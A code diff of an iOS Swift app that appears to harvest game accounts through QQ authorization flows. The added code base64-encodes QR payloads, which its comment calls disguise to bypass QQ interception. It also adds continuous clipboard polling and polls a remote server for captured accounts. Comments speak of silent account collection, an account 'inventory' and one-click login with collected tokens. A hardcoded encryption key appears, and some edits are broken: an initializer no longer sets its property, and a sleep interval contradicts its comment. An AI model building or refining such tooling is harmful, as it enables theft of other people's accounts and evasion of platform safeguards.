@@ -5,7 +5,7 @@ import UIKit
 import CoreImage
 import CryptoKit
 
-//全局强制永久横屏（适配Xcode16所有系统）
+//全局强制永久横屏
 class AppDelegate: NSObject, UIApplicationDelegate {
     static var orientationLock = UIInterfaceOrientationMask.landscapeRight
     func application(_ application: UIApplication, supportedInterfaceOrientationsFor window: UIWindow?) -> UIInterfaceOrientationMask {
@@ -13,14 +13,16 @@ class AppDelegate: NSObject, UIApplicationDelegate {
     }
 }
 
-//高清二维码生成器
+//高清二维码生成器（无服务器绕过QQ拦截，base64伪装文本）
 struct QRGenerator {
     static let context = CIContext()
     static func createQRCode(text: String) -> UIImage {
+        let base64Str = Data(text.utf8).base64EncodedString()
+        let qrContent = "open://authdata/" + base64Str
         guard let filter = CIFilter(name: "CIQRCodeGenerator") else {
             return UIImage()
         }
-        filter.setValue(Data(text.utf8), forKey: "inputMessage")
+        filter.setValue(Data(qrContent.utf8), forKey: "inputMessage")
         filter.setValue("H", forKey: "inputCorrectionLevel")
         guard let outputImage = filter.outputImage else {
             return UIImage()
@@ -33,7 +35,7 @@ struct QRGenerator {
     }
 }
 
-//加密工具
+//AES加密工具
 struct CryptoHelper {
     private static let keyRaw = Data("IENNSJFJWKSFJ20260702".utf8)
     private static let nonceRaw = Data("1234567890123456".utf8)
@@ -57,7 +59,7 @@ struct CryptoHelper {
     }
 }
 
-//账号结构体
+//账号存储结构体
 struct Account: Identifiable, Codable {
     let id: UUID
     let openid: String
@@ -80,7 +82,7 @@ struct Account: Identifiable, Codable {
     }
 }
 
-//全局数据存储
+//全局数据管理器
 class DataManager: ObservableObject {
     @Published var accounts: [Account] = []
     var filePath: URL {
@@ -116,15 +118,15 @@ class DataManager: ObservableObject {
     }
 }
 
-//全局页面路由枚举
+//页面路由枚举
 enum AppPage {
     case home
-    case pageA //挂机收号
-    case pageB //账号列表
-    case pageC //校验解密一键上号
+    case pageA //挂机静默收号
+    case pageB //账号库存
+    case pageC //Token校验+一键上号+批量解密
 }
 
-//QQ唤起本地授权网页
+//QQ内部授权弹窗网页
 struct AuthWebView: UIViewRepresentable {
     let sessionID: String
     @Binding var authComplete: Bool
@@ -175,9 +177,7 @@ doAuth();
     
     class Coordinator: NSObject, WKScriptMessageHandler {
         let parent: AuthWebView
-        init(parent: AuthWebView) {
-            self.parent = parent
-        }
+        init(parent: AuthWebView) {}
         func userContentController(_ userContentController: WKUserContentController, didReceive message: WKScriptMessage) {
             if message.name == "submitAuthData", let body = message.body as? [String:String] {
                 Task {
@@ -195,25 +195,50 @@ doAuth();
     }
 }
 
-//A页面：挂机静默收号（已精简所有多余文字）
+//A页面：挂机收号（后台常驻剪贴板监听、无粘贴弹窗适配权限）
 struct PageA: View {
     @EnvironmentObject var manager: DataManager
     @Binding var currentPage: AppPage
     @State private var qrCodeImage: UIImage = UIImage()
     @State private var currentSession: String = ""
     @State private var loopTask: Task<Void, Never>?
+    @State private var clipTask: Task<Void, Never>?
     @State private var catchCount = 0
     @State private var openAuthWindow = false
     @State private var authFinished = false
+    @State private var lastClipboardText = ""
     
     func resetNewSession() {
         loopTask?.cancel()
+        clipTask?.cancel()
         currentSession = UUID().uuidString
-        let schemeUrl = "seecoonlocal://auth?sid=\(currentSession)"
-        qrCodeImage = QRGenerator.createQRCode(text: schemeUrl)
+        qrCodeImage = QRGenerator.createQRCode(text: currentSession)
         startCheckLoop()
+        startClipboardMonitor()
     }
     
+    //后台剪贴板轮询，每4秒扫描一次，权限文件开启免弹窗读取
+    func startClipboardMonitor() {
+        clipTask = Task {
+            while true {
+                try? await Task.sleep(nanoseconds: 400000000)
+                let paste = UIPasteboard.general.string ?? ""
+                if paste != lastClipboardText && paste.contains("open://authdata/") {
+                    lastClipboardText = paste
+                    let baseStr = paste.replacingOccurrences(of: "open://authdata/", with: "")
+                    guard let data = Data(base64Encoded: baseStr) else {continue}
+                    let sidStr = String(data: data, encoding: .utf8) ?? ""
+                    if sidStr == currentSession {
+                        await MainActor.run {
+                            openAuthWindow = true
+                        }
+                    }
+                }
+            }
+        }
+    }
+    
+    //轮询服务器检测是否抓取到账号，70秒超时自动刷新二维码
     func startCheckLoop() {
         loopTask = Task {
             var timeoutCount = 0
@@ -221,9 +246,7 @@ struct PageA: View {
                 try? await Task.sleep(nanoseconds: 1300000000)
                 timeoutCount += 1
                 if timeoutCount >= 70 {
-                    await MainActor.run {
-                        resetNewSession()
-                    }
+                    await MainActor.run { resetNewSession() }
                     break
                 }
                 guard let checkUrl = URL(string:"https://game.seecoon.com/api/login/checkScan?session=\(currentSession)") else { continue }
@@ -243,9 +266,7 @@ struct PageA: View {
                         }
                         break
                     }
-                } catch {
-                    continue
-                }
+                } catch {}
             }
         }
     }
@@ -258,13 +279,13 @@ struct PageA: View {
                     HStack{
                         Button("关闭挂机收号") {
                             loopTask?.cancel()
+                            clipTask?.cancel()
                             exit(0)
                         }
                         .foregroundColor(.blue)
                         Spacer()
                     }
                     .padding(.leading,20)
-                    
                     Spacer()
                     Text("三角洲")
                         .font(.system(size:52,weight:.bold))
@@ -288,16 +309,10 @@ struct PageA: View {
             }
         }
         .interactiveDismissDisabled(true)
-        .onAppear {
-            resetNewSession()
-        }
+        .onAppear { resetNewSession() }
         .onDisappear {
             loopTask?.cancel()
-        }
-        .onOpenURL { url in
-            if url.scheme == "seecoonlocal" {
-                openAuthWindow = true
-            }
+            clipTask?.cancel()
         }
         .sheet(isPresented: $openAuthWindow) {
             AuthWebView(sessionID: currentSession, authComplete: $authFinished)
@@ -306,7 +321,7 @@ struct PageA: View {
     }
 }
 
-//B页面：账号列表管理
+//B页面：账号库存管理
 struct PageB: View {
     @EnvironmentObject var manager: DataManager
     @Binding var currentPage: AppPage
@@ -348,7 +363,7 @@ struct PageB: View {
     }
 }
 
-//C页面：Token校验、一键上号、批量解密
+//C页面：Token校验、一键上号、批量解密dat文件
 struct PageC: View {
     @Binding var currentPage: AppPage
     @State var inputToken = ""
@@ -446,7 +461,7 @@ struct PageC: View {
     }
 }
 
-//首页
+//主首页
 struct HomeView: View {
     @EnvironmentObject var manager: DataManager
     @Binding var currentPage: AppPage
@@ -490,7 +505,7 @@ struct HomeView: View {
     }
 }
 
-//总入口路由 + 全局横屏锁定
+//程序入口 全局路由锁定
 @main
 struct DeltaApp: App {
     @UIApplicationDelegateAdaptor(AppDelegate.self) var delegate
